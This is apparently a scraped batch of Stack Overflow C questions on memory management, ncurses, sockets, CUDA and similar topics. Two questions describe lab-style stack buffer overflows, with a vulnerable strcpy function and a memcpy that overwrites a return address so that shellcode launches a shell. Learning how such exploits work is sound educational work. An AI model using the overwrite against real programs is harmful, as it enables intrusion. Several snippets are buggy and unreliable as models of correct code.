declared.</p>\n"},{"tags":["c++","c","memory-management","return"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":81,"score":3,"question_id":13221400,"title":"How to deal with pointers to dynamic memory being returned in C/C++","body":"<p>I was wondering the protocol for dealing with memory leaks with pointers to dynamic memory being returned in C and C++. For example, strtok returns a char*. Presumably, the pointer that is returned must eventually be freed/deleted. I note that the <a href=\"http://www.cplusplus.com/reference/clibrary/cstring/strtok/\" rel=\"nofollow\">reference page</a> doesn't even mention this. Is that because this is simply assumed? Also, how do you know whether to delete or free? Does one have to do research to find out what language each function was originally in, and then assume that all C programs use malloc/free and C++ uses new/delete?</p>\n"},{"tags":["c++","c","algorithm"],"answer_count":3,"favorite_count":2,"up_vote_count":8,"down_vote_count":6,"view_count":649,"score":2,"question_id":13216041,"title":"Number of tuples","body":"<p>I am given N numbers a[1..N] and 2 other integers L and H. How can I Count the number of tuples (i,j,k) satisfying i &lt; j &lt; k and L &lt;= a[i] + a[j] + a[k] &lt;= H.</p>\n\n<pre><code>1 &lt;= T &lt;= 100\n1 &lt;= N &lt;= 1000\n1 &lt;= L &lt;= H &lt;= 1000000\n1 &lt;= a[i] &lt;= 1000000 \n</code></pre>\n\n<p>PS: Need Better Solution than N2logn</p>\n"},{"tags":["c"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":44,"score":1,"question_id":13245786,"title":"MENU with help of ncurses library","body":"<p>Hello everybody,\n                I had edited a example code given according to myself.It has 2 menu with same options and i want to change the options of both the menu and when any of the option is selected,it must be printed on the message bar,but i am unable to do so.\nI am facing 2 problems.\ni) Unable to change the options of 2 menus.\nii) The selected item is not printed on the message bar.</p>\n\n<p>Need help.Below is the code edited by me from the link \nwww.linuxfocus.org/English/March2002/article233.shtml\nt</p>\n\n<p>and here is my code.</p>\n\n<pre><code>#include &lt;curses.h&gt;\n#include &lt;stdlib.h&gt;\n\n#define ENTER 10\n#define ESCAPE 27\nvoid init_curses()\n{\n        initscr();\n        start_color();\n        init_pair(1,COLOR_WHITE,COLOR_BLUE);\n        init_pair(2,COLOR_BLUE,COLOR_WHITE);\n        init_pair(3,COLOR_RED,COLOR_WHITE);\n        curs_set(0);\n        noecho();\n        keypad(stdscr,TRUE);\n}\nvoid draw_menubar(WINDOW *menubar)\n{\n        wbkgd(menubar,COLOR_PAIR(2));\n        waddstr(menubar,\"PARALLEL\");\n        wattron(menubar,COLOR_PAIR(3));\n        waddstr(menubar,\"CON.\");\n        wattroff(menubar,COLOR_PAIR(3));\n        wmove(menubar,0,20);\n        waddstr(menubar,\"SERIAL\");\n        wattron(menubar,COLOR_PAIR(3));\n        waddstr(menubar,\"CON.\");\n        wattroff(menubar,COLOR_PAIR(3));\n}\nWINDOW **draw_menu(int start_col)\n{\n\n        WINDOW **items;\n        items=(WINDOW **)malloc(9*sizeof(WINDOW *));\n\n        items[0]=newwin(10,19,1,start_col);\n        wbkgd(items[0],COLOR_PAIR(2));\n        box(items[0],ACS_VLINE,ACS_HLINE);\n        items[1]=subwin(items[0],1,17,2,start_col+1);\nwprintw(items[1],\"Shailendra singh\",1);\n        items[2]=subwin(items[0],1,17,3,start_col+1);\nwprintw(items[2],\"THIVNENT TECH\",2);\n        items[3]=subwin(items[0],1,17,4,start_col+1);\nwprintw(items[3],\"THINCLIENT\",3);\n        items[4]=subwin(items[0],1,17,5,start_col+1);\nwprintw(items[4],\"SOLARCOMPUTING\",4);\n        items[5]=subwin(items[0],1,17,6,start_col+1);\nwprintw(items[5],\"TECHNOCRATS\",5);\n        items[6]=subwin(items[0],1,17,7,start_col+1);\nwprintw(items[6],\"SENSORS\",6);\n        items[7]=subwin(items[0],1,17,8,start_col+1);\nwprintw(items[7],\"NCURSESLIB\",7);\n        items[8]=subwin(items[0],1,17,9,start_col+1);\nwprintw(items[8],\"GCC COMPILER\",8);\n\n\n\n\n\n        wbkgd(items[1],COLOR_PAIR(1));\n        wrefresh(items[0]);\n        return items;\n}\nvoid delete_menu(WINDOW **items,int count)\n{\n        int i;\n        for (i=0;i&lt;count;i++)\n                delwin(items[i]);\n        free(items);\n}\nint scroll_menu(WINDOW **items,int count,int menu_start_col)\n{\n        int key;\n        int selected=0;\n        while (1) {\n                key=getch();\n                if (key==KEY_DOWN || key==KEY_UP) {\n                        wbkgd(items[selected+1],COLOR_PAIR(2));\n                        wnoutrefresh(items[selected+1]);\n                        if (key==KEY_DOWN) {\n                                selected=(selected+1) % count;\n                        } else {\n                                selected=(selected+count-1) % count;\n                        }\n                        wbkgd(items[selected+1],COLOR_PAIR(1));\n                        wnoutrefresh(items[selected+1]);\n                        doupdate();\n                } else if (key==KEY_LEFT || key==KEY_RIGHT) {\n                        delete_menu(items,count+1);\n                        touchwin(stdscr);\n                        refresh();\n                        items=draw_menu(20-menu_start_col);\n                        return scroll_menu(items,8,20-menu_start_col);\n                } else if (key==ESCAPE) {\n                        return -1;\n                } else if (key==ENTER) {\n                        return selected;\n                }\n        }\n}\nint main()\n{\n    int key;\n    WINDOW *menubar,*messagebar;\n\n    init_curses();\n\n    bkgd(COLOR_PAIR(1));\n    menubar=subwin(stdscr,1,80,0,0);\n    messagebar=subwin(stdscr,1,79,23,1);\n    draw_menubar(menubar);\n    move(2,1);\n    printw(\"Press F1 or F2 to open the menus. \");\n    printw(\"ESC quits.\");\n    refresh();\n\n    do {\n        int selected_item;\n        WINDOW **menu_items;\n        key=getch();\n        werase(messagebar);\n        wrefresh(messagebar);\n        if (key==KEY_F(1)) {\n            menu_items=draw_menu(0);\n            selected_item=scroll_menu(menu_items,8,0);\n            delete_menu(menu_items,9);\n            if (selected_item&lt;0)\n                wprintw(messagebar,\"You haven't selected any item.\");\n            else if(selected_item=1)\n                wprintw(messagebar,\"You have selected menu SHAILENDRA SINGH.\",1);\n            else if(selected_item=2)\n                wprintw(messagebar,\"You have selected menu THINVENT TECH.\",2);\n            else if(selected_item=3)\n                wprintw(messagebar,\"You have selected menu THINCLIENT.\",3);\n            else if(selected_item=4)\n                wprintw(messagebar,\"You have selected menu SOLAR COMPUTING\",4);\n            else if(selected_item=5)\n                wprintw(messagebar,\"You have selected menu TECHNOCRATS.\",5);\n            else if(selected_item=6)\n                wprintw(messagebar,\"You have selected menu SENSORS.\",6);\n            else if(selected_item=7)\n                wprintw(messagebar,\"You have selected menu NCURSESLIB.\",7);\n            else if(selected_item=8)\n                wprintw(messagebar,\"You have selected menu GCCCOMPILER.\",8);\n\n\n            touchwin(stdscr);\n            refresh();\n        } \n        }\n    while (key!=ESCAPE);\n\n    delwin(menubar);\n    delwin(messagebar);\n    endwin();\n    return 0;\n}\n</code></pre>\n"},{"tags":["c","stack"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":1,"view_count":86,"score":3,"question_id":13244531,"title":"C function stack layout","body":"<p>I have a function that looks like so:</p>\n\n<pre><code>int bof(char *str)\n{\n    char buffer[12];\n\n    strcpy(buffer, str);\n\n    return 1;\n}\n</code></pre>\n\n<p>I am attempting to overwrite its return address. I have found that I can do so by using, for instance, <code>memcpy(buffer+24, \"\\x15\\xf1\\xff\\xbf\", 4)</code>. What I do not understand is why I need to access <code>buffer + 24</code>. My understanding of the C memory model tells me that the stack when this function is executed should look like </p>\n\n<pre><code>bottom of                                                            top of\nmemory                                                               memory\n           buffer(12)     sfp(4)   ret(4)   str(4)\n&lt;------   [            ][       ][       ][       ] ---&gt;\n\ntop of                                                            bottom of\nstack                                                                 stack\n</code></pre>\n\n<p>This would suggest that I should the ret address should begin at buffer+16. Where are the extra 8 bytes coming in?</p>\n\n<p>By the way, I am running this on a 32-bit system.</p>\n"},{"tags":["c"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":7,"view_count":41,"score":-7,"question_id":13245909,"title":"how to write 1 to 10 in a file using WriteFile? using C program","body":"<p>how to write 1 to 10 in a file using WriteFile?\nI tried doing it but its not printing the values properly in the file.</p>\n"},{"tags":["c","sockets","networking"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":13241519,"title":"Sockets in C errors","body":"<p>I am doing C sockets for the first time and I am running into a small error with my code. As I compile it works correctly and compiles fine it just throws some errors and I want to know how to fix them. </p>\n\n<p>Here is the code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;arpa/inet.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;netinet/in.h&gt;\n#include &lt;sys/socket.h&gt;\n\n#define PORTNUM 2343\n\nint main(int argc, char *argv[])\n{\n    char msg[] = \"Hello World !\\n\";\n\n    struct sockaddr_in dest; /* socket info about the machine connecting to us */\n    struct sockaddr_in serv; /* socket info about our server */\n    int mysocket;            /* socket used to listen for incoming connections */\n    int socksize = sizeof(struct sockaddr_in);\n\n    memset(&amp;serv, 0, sizeof(serv));    /* zero the struct before filling the fields */\n    serv.sin_family = AF_INET;         /* set the type of connection to TCP/IP */\n    serv.sin_addr.s_addr = INADDR_ANY; /* set our address to any interface */\n    serv.sin_port = htons(PORTNUM);    /* set the server port number */    \n\n    mysocket = socket(AF_INET, SOCK_STREAM, 0);\n\n    /* bind serv information to mysocket */\n    bind(mysocket, (struct sockaddr *)&amp;serv, sizeof(struct sockaddr));\n\n    /* start listening, allowing a queue of up to 1 pending connection */\n    listen(mysocket, 1);\n    int consocket = accept(mysocket, (struct sockaddr *)&amp;dest, &amp;socksize);\n\n    while(consocket)\n    {\n        printf(\"Incoming connection from %s - sending welcome\\n\", inet_ntoa(dest.sin_addr));\n        send(consocket, msg, strlen(msg), 0); \n        consocket = accept(mysocket, (struct sockaddr *)&amp;dest, &amp;socksize);\n    }\n\n    close(consocket);\n    close(mysocket);\n    return EXIT_SUCCESS;\n}\n</code></pre>\n\n<p>I got this from a website as an simple example. </p>\n\n<p>Here is the compiler error:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>server.c: In function ‘main’:\nserver.c:33:46: warning: pointer targets in passing argument 3 of ‘accept’ differ in signedness [-Wpointer-sign]\n/usr/include/i386-linux-gnu/sys/socket.h:214:12: note: expected ‘socklen_t * __restrict__’ but argument is of type ‘int *’\nserver.c:39:46: warning: pointer targets in passing argument 3 of ‘accept’ differ in signedness [-Wpointer-sign]\n/usr/include/i386-linux-gnu/sys/socket.h:214:12: note: expected ‘socklen_t * __restrict__’ but argument is of type ‘int *’\n</code></pre>\n\n<p>Thanks for the help! :)</p>\n"},{"tags":["c++","c","kdevelop4"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":116,"score":3,"question_id":8052263,"title":"Move source files in KDevelop4","body":"<p>This may sounds a little trivial but I really dont get it. </p>\n\n<p>The <a href=\"http://upload.wikimedia.org/wikipedia/commons/2/26/KDevelop_4_Screenshot.png\" rel=\"nofollow\">ProjectView</a> (Left side of the screen) displays all files of your project. You are able to create and delete files but you can't move files to different folders (I'm familar with MSVC).</p>\n\n<p>Is there a way of moving source files in Kdevelop?</p>\n"},{"tags":["c","cuda","gpu","nvidia"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":13216174,"title":"Error while compiling Hello world program for CUDA","body":"<p>I am using Ubuntu 12.10 and have sucessfully installed CUDA 5.0 and its sample kits too. I have also run <code>sudo apt-get install nvidia-cuda-toolkit</code> Below is my hello world program for CUDA:</p>\n\n<pre><code>#include &lt;stdio.h&gt;  /* Core input/output operations                         */\n#include &lt;stdlib.h&gt; /* Conversions, random numbers, memory allocation, etc. */\n#include &lt;math.h&gt;   /* Common mathematical functions                        */\n#include &lt;time.h&gt;   /* Converting between various date/time formats         */\n#include &lt;cuda.h&gt;   /* CUDA related stuff                                   */\n\n\n__global__ void kernel(void) {\n}\n\n/* MAIN PROGRAM BEGINS */\nint main(void) {\n\n  /* Dg = 1; Db = 1; Ns = 0; S = 0 */\n  kernel&lt;&lt;&lt;1,1&gt;&gt;&gt;();\n\n  /* PRINT 'HELLO, WORLD!' TO THE SCREEN */\n  printf(\"\\n  Hello, World!\\n\\n\");\n\n  /* INDICATE THE TERMINATION OF THE PROGRAM */\n  return 0;\n}\n/* MAIN PROGRAM ENDS */\n</code></pre>\n\n<p>The following error occurs when I compile it with <code>nvcc -g hello_world_cuda.cu -o hello_world_cuda.x</code></p>\n\n<pre><code>/tmp/tmpxft_000033f1_00000000-13_hello_world_cuda.o: In function `main':\n/home/adarshakb/Documents/hello_world_cuda.cu:16: undefined reference to `cudaConfigureCall'\n/tmp/tmpxft_000033f1_00000000-13_hello_world_cuda.o: In function `__cudaUnregisterBinaryUtil':\n/usr/include/crt/host_runtime.h:172: undefined reference to `__cudaUnregisterFatBinary'\n/tmp/tmpxft_000033f1_00000000-13_hello_world_cuda.o: In function `__sti____cudaRegisterAll_51_tmpxft_000033f1_00000000_4_hello_world_cuda_cpp1_ii_b81a68a1':\n/tmp/tmpxft_000033f1_00000000-1_hello_world_cuda.cudafe1.stub.c:1: undefined reference to `__cudaRegisterFatBinary'\n/tmp/tmpxft_000033f1_00000000-1_hello_world_cuda.cudafe1.stub.c:1: undefined reference to `__cudaRegisterFunction'\n/tmp/tmpxft_000033f1_00000000-13_hello_world_cuda.o: In function `cudaError cudaLaunch&lt;char&gt;(char*)':\n/usr/lib/nvidia-cuda-toolkit/include/cuda_runtime.h:958: undefined reference to `cudaLaunch'\ncollect2: ld returned 1 exit status\n</code></pre>\n\n<p>I am also making sure that I use gcc and g++ version 4.4 ( As 4.7 there is some problem with CUDA)</p>\n"},{"tags":["c","debugging","gdb","elf","instrumentation"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":13242926,"title":"In ELF or DWARF, how can I get .PLT section values? -- Trying to get the address of a function on where an instrumentation tool is in","body":"<p>I am working in obtaining all the data of a program using its ELF and DWARF info and by hooking a pin tool to a process that is currently running -- It is kind of a debugger using a Pin tool.</p>\n\n<p>For getting the local variables from the stack I am working with the registers EIP, EBP and ESP which I have access to from Pin. </p>\n\n<p>What stroke me as weird is that I was expecting EIP to be pointing to the current function that was running when the pin tool was attached to the process, but instead EIP is pointing to the section .PLT. In other words, if the pin tool was hooked into the process when Foo() was running, then I was expecting EIP to be pointing to some address inside the Foo function. However it is pointing to the beginning of the .PLT section.</p>\n\n<p>What I need to know is which function the process is currently in -- Is there any way to get the address of the function using the .PLT section? Is there any other ways to get the address of the function from the stack or using Pin? I hope I was clear enough, let me know if there are any questions though.</p>\n"},{"tags":["c"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":13245122,"title":"can I get the 2s complement representation of integer from register?","body":"<p>I think if some integer is in register by scanf, then the number would be in 2s complement representation. Can I get that number by printf? I searched many websites but couldnt find the code for C beginners... </p>\n"},{"tags":["c++","c","static","global-variables","shared-libraries"],"answer_count":3,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":83,"score":5,"question_id":13244876,"title":"Should static member functions be avoided in shared libraries?","body":"<p>In reading the book \"Writing Scientific Software\" by Oliveira and Stewart, I came across this interesting passage:</p>\n\n<blockquote>\n  <p>\"<em>Shared variables are dangerous and should be avoided in shared libraries</em></p>\n  \n  <p>So if you are writing a shared or dynamically linked library, avoid <code>static</code> or <code>saved</code> local variables and avoid global variables.\"</p>\n  \n  <p>(page 55)</p>\n</blockquote>\n\n<p>But what about <code>static</code> member functions? Are these equally as dangerous in a shared library? Should I avoid these as well? Why/why not?</p>\n"},{"tags":["c","arrays","fscanf"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":27,"score":2,"question_id":13244735,"title":"fscanf variable not setting correctly. possibly realloc()","body":"<p>Output says all array values are \"anxiety\" when the words of file fileIn are printing correctly and in order. My problem may be in the realloc()?</p>\n\n<pre><code>    ReadIn = malloc(sizeof(char) * 50);\n\n    while(fscanf(fileIn, \"%s\", ReadIn) != EOF){\n        wordlist = (char **)realloc( wordlist, (numwords + 1) * sizeof(char*));\n        printf(\"%s\\n\",ReadIn);\n        wordlist[numwords] = ReadIn;\n        numwords++;\n    }\n\n    for(i = 0; i &lt; numwords; i++){\n        printf(\"%d %s\\n\", i , wordlist[i]);\n    }\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>This\nis\na\njourney\ninto\nfear\nand\nanxiety.\n0 anxiety.\n1 anxiety.\n2 anxiety.\n3 anxiety.\n4 anxiety.\n5 anxiety.\n6 anxiety.\n7 anxiety.\n</code></pre>\n"},{"tags":["c","switch-statement"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":13232417,"title":"How to use a variable in the case field of switch statement?","body":"<p>Even though the switch syntax is not accepting variables for case labels are there any workarounds to perform similar operation instead of the plain old if-else comparison ?</p>\n"},{"tags":["c","semaphore","pseudocode"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":13244400,"title":"Pseudo Code for Producer Consumer Synchronization","body":"<p>I'm having some trouble writing Pseduocode for a homework assignment in my operating systems class in which we are programming in C.  </p>\n\n<blockquote>\n  <p>You   will    be  implementing    a   Producer-Consumer   program with    a    bounded    buffer  queue   of  N   elements,   P   producer    threads and C   consumer    threads \n  (N, P   and C   should  be  command line    arguments   to  your    program,    along   with    three    additional parameters, X,  Ptime   and Ctime,  that    are described   below).     <strong>Each<br>\n  Producer    thread  should  Enqueue X   different numbers   onto    the queue   (spin-waiting    for    Ptime*100,000 cycles    in  between each    call    to  Enqueue).       Each    Consumer    thread<br>\n  should  Dequeue P*X/C   items   from    the queue   (spin-waiting   for Ctime*100,000 cycles\n  in  between each    call    to  Dequeue).</strong>         The main    program should  create/initialize   the \n  Bounded Buffer  Queue,  print   a   timestamp,  spawn   off C   consumer    threads &amp;   P<br>\n  producer    threads,    wait    for all of  the threads to  finish  and then    print   off another \n  timestamp   &amp;   the duration    of  execution.</p>\n</blockquote>\n\n<p>My main difficulty is understanding what my professor means by spin-waiting for the variables times 100,000. I have bolded the section that is confusing me.</p>\n\n<p>I understand a time stamp will be used to print the difference between each thread. We are using semaphores and implementing synchronization at the moment. Any suggestions on the above queries would be much appreciated.  </p>\n"},{"tags":[".net","c","winapi"],"answer_count":0,"favorite_count":1,"up_vote_count":3,"down_vote_count":1,"view_count":31,"score":2,"question_id":13244584,"title":"Adding a new network interface tab/adapter?","body":"<p>How to add a new network interface adapter/tab via coding?\nlike VPN clients do...</p>\n"},{"tags":["c","arrays","memory-management"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":79,"score":2,"question_id":13244089,"title":"C, array, how to make use of strlen","body":"<p>i am writing a simple program and would like to use the strlen function to get the size of the string in question.</p>\n\n<p>Then i would like to create an array for example <strong>testarray[strlen(somestring)];</strong></p>\n\n<p>But it cannot compile, the error says <strong>\"error: variable-sized object may not be initialized\"</strong>.</p>\n\n<p>However, the length of that string will not change so i guess i have to tell my machine that somehow.</p>\n\n<p>I have only access to these headers.</p>\n\n<p>stdio.h\nstring.h</p>\n\n<p>Would be great if somebody could drop some knowledge bombs. :)</p>\n\n<p>edit:\nI was wrong <strong>testarray[strlen(somestring)];</strong> can compile but <strong>testarray[strlen(somestring)] = {};</strong> cannot. With <strong>testarray[strlen(somestring)];</strong> i have garbage if i try to use it.</p>\n\n<p><em>Thanks guys, it is working now with memset!</em></p>\n"},{"tags":["c","stack","buffer-overflow"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":13243499,"title":"Finding address of C variable without debugging","body":"<p>I'm working on a basic buffer overflow project. The goal is to overflow a buffer to run a shell. The code I'm exploiting looks like this:</p>\n\n<pre><code>int func(char *str)\n{\n    //4 bytes for str, 16 bytes for the buffer, 4 for the ebp, 4 for the ret\n    char buffer[12];\n\n    /* The following statement has a buffer overflow problem */ \n    strcpy(buffer, str);\n\n    return 1;\n}\n</code></pre>\n\n<p>Essentially, I am creating str so that it will overwrite the return address of func() with the address of some shellcode that starts a shell.</p>\n\n<p>If I compile my code with the gcc -g option and run the executable in gdb, everything works fine. However, if I omit the -g, I get a segfault instead of a shell.</p>\n\n<p>If I understand things correctly, this is most likely due to the fact that gdb adds things to the stack. This would mean that I need to change the value that I use to replace func's return address. How would I go about finding this new address?</p>\n\n<p>I have tried adding a printf(\"%p\", str); to func, then compiling and running with and without -g but this prints the same thing either way. I have tried several other similar things as well.</p>\n"},{"tags":["c","arrays","initialization","array-initialize"],"answer_count":13,"favorite_count":54,"up_vote_count":132,"down_vote_count":0,"view_count":312421,"score":132,"question_id":201101,"title":"How to initialize an array in C","body":"<p>I have a large array in C (not C++ if that makes a difference). I want to initialize all members to the same value. I could swear I once knew a simple way to do this. I could use <code>memset()</code> in my case, but isn't there a way to do this that is built right into the C syntax?</p>\n"},{"tags":["c#","mysql","c","connection","mysqlconnection"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":13241931,"title":"Connecting C# to MySQL and openning connection","body":"<p>This is my simple code just to read something from MySQL. But want I want is to create connection and command when Form is opened and just to open connection when button is clicked and do the rest. But It says </p>\n\n<pre><code>\"The name 'konekcija' does not exist in the current context\"\n</code></pre>\n\n<p>Could someone help me and explain me please.</p>\n\n<pre><code>namespace mysql_windows_console\n{\n    public partial class Form1 : Form\n    {\n        public Form1()\n        {\n            InitializeComponent();\n        }\n\n        public void Form1_Load(object sender, EventArgs e)\n        {\n            /*========MYSQL KONEKCIJA===========*/\n            string baza               = \"server=localhost;database=test;user=root;password=;\";\n            MySqlConnection konekcija = new MySqlConnection(baza);\n            MySqlCommand comm         = konekcija.CreateCommand();\n            /*========MYSQL KONEKCIJA===========*/\n        }\n\n        private void button1_Click(object sender, EventArgs e)\n        {\n            konekcija.Open();\n            string sql               = \"SELECT IME,PREZIME FROM tabela\";\n            MySqlDataAdapter adapter = new MySqlDataAdapter(sql,konekcija);\n            DataTable tab            = new DataTable();\n            adapter.Fill(tab);\n            dataGridView1.DataSource = tab;\n            konekcija.Close();\n        }\n    }\n}\n</code></pre>\n"},{"tags":["c++","c"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":72,"score":2,"question_id":13243886,"title":"Init local array with zeros in C++","body":"<p>I'm looking for a fast way to init local array with zeros. (By \"Fast\", I mean \"Fast to type.\") When I do the following:</p>\n\n<pre><code>HANDLE hHandles[32] = {0};\n</code></pre>\n\n<p>does it zero out the first element or all 32?</p>\n"},{"tags":["c","debugging","memory-leaks","stackoverflow","iar"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13243972,"title":"How to debug a stack overflow in C in IAR Workbench","body":"<p>I'm working on a C project using IAR Embedded Workbench IDE and the TI CC2540 Bluetooth Low Energy 8051 chip.</p>\n\n<p>I seem to be getting tons of XData stack and Idata stack overflows while working on the project, and it has been very difficult for me to determine where the overflows are coming from.  I am working with a significant amount of strings via the UART ports.</p>\n\n<p>I was wondering if anyone had any tips on how to ensure that I am deallocating memory after I've allocated, and ensure that I stay within the boundaries of my stack and heap.</p>\n\n<p>Thanks</p>\n"},{"tags":["c","list","pointers","linked","pop"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13243685,"title":"C Linked List Stack Pop Function","body":"<p>So I am running very short on time to complete this. I only have one thing left to do, and it's a pop function for a linked list stack. I'm not exactly sure why I can't get it to work, well I understand why, but I don't understand how to fix said problem. Here is the code...</p>\n\n<pre><code>void pop(node** hd){\n    if(hd == NULL){\n        printf(\"%s %c\", \"No solution available, exiting program.\");\n        exit(-1);\n    }\n    node* temp = (*hd) -&gt; next;\n    free(hd);\n    if(temp == NULL){\n        printf(\"%s %c\", \"No solution available, exiting program.\");\n        exit(-1);\n    }\n    *hd = temp;\n}\n</code></pre>\n\n<p>Here is the struct...</p>\n\n<pre><code>typedef struct nodeStruct\n{\nint valX, valY;\nstruct nodeStruct* next;\n}node;\n</code></pre>\n\n<p><a href=\"http://pastie.org/5193436\" rel=\"nofollow\">TEST PROGRAM</a></p>\n"},{"tags":["c","postgresql"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":56,"score":2,"question_id":13236714,"title":"Achieving high-performance transactions when extending PostgreSQL with C-functions","body":"<p>My goal is to achieve the highest performance available for copying a block of data from the database into a C-function to be processed and returned as the result of a query.</p>\n\n<p>I am new to PostgreSQL and I am currently researching possible ways to move the data. Specifically, I am looking for nuances or keywords related specifically to PostgreSQL to move big data fast.</p>\n\n<p><strong>NOTE:</strong>\n<em>My ultimate goal is speed, so I am willing to accept answers outside of the exact question I have posed as long as it gets big performance results. For example, I have come across the COPY keyword (PostgreSQL only), which moves data from tables to files quickly; and vice versa. I am trying to stay away from processing that is external to the database, but if it provides a performance improvement that out-weighs the obvious drawback of external processing, then so be it.</em></p>\n"},{"tags":["c","linux","header-files"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":577,"score":1,"question_id":10342164,"title":"#include-ing certain header files in old C source (page.h et al) on Ubuntu","body":"<p>I'm new to GNU/Linux (Lubuntu 11.10) and am trying to compile some C source code out of a Linux programming book from 2001. Am somewhat confused about the inclusion of header files in GNU/Linux.</p>\n\n<p>The program is \"simplefb.c\" from the book <strong>Programming Linux Games</strong> by John R. Hall et al (2001). I jumped straight to the chapter on console programming with framebuffer but hit this immediate snag. Would just like to make some simple non-GUI (and non-'text') games in C on Linux for fun...</p>\n\n<p>The problem seems to be with a few #includes to header files:</p>\n\n<pre><code>#include &lt;asm/page.h&gt;\n#include &lt;sys/mman.h&gt;\n#include &lt;sys/ioctl.h&gt;\n#include &lt;linux/fb.h&gt;\n</code></pre>\n\n<p>Trying the code as given in the book:  </p>\n\n<p><strong>> cc the_file.c</strong><br>\ngives<br>\n<em>fatal error: asm/page.h: No such file or directory\ncompilation terminated.</em></p>\n\n<p>And indeed it seems that these files live somewhere else (nowadays?) so I tried amending initially just the first #include to:</p>\n\n<pre><code>#include &lt;/usr/src/linux-headers-3.0.0-17-generic/include/asm-generic/page.h&gt;    \n</code></pre>\n\n<p>I chose this particular folder of headers (there are several in /usr/src/) because<br>\n<strong>> uname -r</strong><br>\n<em>3.0.0-17-generic</em></p>\n\n<p>With the amended #include, I then get the compilation error:</p>\n\n<p>In file included from the_file.c<br>\n<em>/usr/src/linux-headers-3.0.0-17-generic/include/asm-generic/page.h:96:38: fatal error: asm-</em><br>\ngeneric/memory_model.h: No such file or directory<br>\ncompilation terminated.</p>\n\n<p>And looking in that page.h, it specifies\ninclude asm-generic/memory_model.h\n(removed the hashs and 'tags' as this line won't show up here properly otherwise)\nbut this file does exist in the same folder.</p>\n\n<p>So, before I go on a wild-goose-chase (firstly removing the asm-generic/ bit of the previous include and putting it in quotes), what is the correct procedure I should be using here? Is there an obvious right way to get the book source code to compile?</p>\n\n<p>Thank you. Will be most grateful for any help.</p>\n"},{"tags":["c"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":13243555,"title":"Passing a double array by reference in C : Bus error 10","body":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid setZero (double **, int);\n\nint main (void) {\n        double *ptr = NULL;\n        int i, size = 3;\n        ptr = (double *)malloc(size * sizeof(double));\n//*\n        setZero(&amp;ptr, size);\n/*/\n        // Sanity test\n        for ( i = 0 ; i &lt; size ; ++i ) {\n                printf(\"index %d/%d\\n\", i, (size-1));\n                ptr[i] = 0;  // NOT EXPLODING...\n        }\n//*/\n        free(ptr);\n        return 0;\n}\n\nvoid setZero (double **_ref_array, int _size) {\n    int i;\n\n    for ( i = 0 ; i &lt; _size; ++i ) {\n        printf(\"index %d/%d\\n\", i, (_size-1));\n        *_ref_array[i] = 0;  // EXPLODING...\n    }\n}\n</code></pre>\n\n<p>1) Why is this not working?</p>\n\n<p>2) What is a \"Bus error 10\"</p>\n\n<p><em>P.S. I know better than to initialize an array this way, but this just happens to be a simple and clean example of an underlying concept that I'm not understanding...</em></p>\n"},{"tags":["c","winapi","visual-c++","wrapper","wndproc"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":440,"score":2,"question_id":8780700,"title":"How to wrap a win32 WndProc into a C++ class?","body":"<p>Is this even possible? For example, let's say I have the following:</p>\n\n<pre><code>class Window {\nprivate:\n    WNDCLASSEX wc;\npublic:\n    inline WNDCLASSEX getWindowClass() {\n        return wc;\n    }\n    Window();\n    LRESULT CALLBACK WndProc(HWND hwnd, UINT message, LPARAM lParam, WPARAM wParam);\n}\n\nvoid RegisterWindow(Window win) {\n    WNDCLASSEX* wc = win.getWindowClass();\n    RegisterClassEx(wc);\n\n}\n</code></pre>\n\n<p>Now, somewhere there is going to be a section (probably in the constructor of the <code>Window</code> class, where it's necessary to assign the <code>WNDCLASSEX</code> a <code>WndProc</code>, which is noted in the <code>Window</code> class. The only issue is that, because it's a part of a class, there an error will be raised. Thus, how is this achieved? Is it made static? Even so, if the class wraps it it is still part of the class in some way. If I create it outside of the class, that simply obliterates the point.</p>\n"},{"tags":["c++","c"],"answer_count":12,"favorite_count":1,"up_vote_count":13,"down_vote_count":1,"view_count":2071,"score":12,"question_id":640657,"title":"What's the difference between C and C++","body":"<p>I know that C++ has the concept of objects but C doesn't. I also know that pretty much all there is to know about C fits into <a href=\"http://rads.stackoverflow.com/amzn/click/0131103628\" 